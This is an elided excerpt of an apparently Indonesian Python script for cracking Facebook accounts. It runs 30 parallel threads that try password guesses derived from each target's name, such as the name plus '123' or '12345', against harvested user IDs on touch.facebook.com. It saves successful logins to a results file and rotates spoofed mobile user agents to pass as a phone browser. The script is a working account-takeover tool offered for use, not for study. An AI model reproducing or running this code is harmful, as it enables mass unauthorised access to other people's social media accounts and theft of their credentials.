	...
	if method == "":
		...
		if ask == "y":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				for user in id:
					uid, name = user.split("<=>")
					coeg.submit(crack, uid, asu, "https://touch.facebook.com")
			exit("\n\n # crack selesai...")
		elif ask == "t":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n + hasil OK tersimpan di : OK/%s.txt"%(tanggal))
				...
				for user in id:
					...
					if len(name)>=6:
						...
						pwx = [ name+"123", name+"12345" ]
					coeg.submit(crack, uid, pwx, "https://touch.facebook.com")
			exit("\n\n # crack selesai...")
		else:
			exit("\n ! isi yang bener")
	else:
...
def setting_ua():
	...
	if ua =="":
		...
		print(" + user agent : Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
		os.system("rm -f .ua")
		time.sleep(1)
		raw_input("\n + berhasil ganti user agent")
		menu()
...
def check_in(user, pasw):
	...
	ua = ("Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36")
	ses = requests.Session()
	#-> pemisah
